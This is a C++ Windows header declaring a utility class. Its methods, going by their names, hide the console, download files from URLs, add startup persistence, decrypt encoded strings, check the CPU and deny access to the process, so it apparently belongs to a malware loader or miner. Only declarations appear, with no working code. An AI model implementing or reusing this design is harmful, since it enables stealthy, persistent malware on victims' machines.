#include <windows.h>
#include <Aclapi.h>
#include "Sddl.h"
#include <io.h>
#include <direct.h>
#include <iostream>
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#pragma comment (lib, "urlmon.lib")

using namespace std;

class Utils
{
public:
	void HideConsole();
	bool FileExists(const char *fname);
	void DownloadFile(wchar_t *url, wchar_t *dir);
	void CreateDir(wchar_t *dir);
	void Autoload(string Name, string Path);
	int getCPU();
	char* UnEnc(char *enc, char *key, DWORD encLen);
	BOOL DenyAccess();
	void createAutoLoadShortcut();
};